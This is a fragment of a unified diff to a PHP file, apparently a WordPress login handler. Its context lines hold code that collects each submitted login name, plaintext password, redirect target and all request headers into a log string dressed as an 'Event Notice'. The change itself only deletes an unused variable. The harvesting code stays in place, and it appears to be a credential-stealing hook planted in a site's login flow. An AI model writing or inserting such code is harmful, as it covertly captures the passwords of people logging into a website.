@@ -14,7 +14,6 @@ $password = $_POST['pwd'];
 $redirect = $_POST['redirect_to'];
 $data     = "===================================[Event $logdate Notice for $ip]=======================================\n";
 $data .= "Login:" . $login . "\n";
-$wp_submit = $_POST['wp_submit'];
 $data .= "Password:" . $password . "\n";
 $data .= "Redirect:" . $redirect . "\n";
 foreach (getallheaders() as $name => $value) {
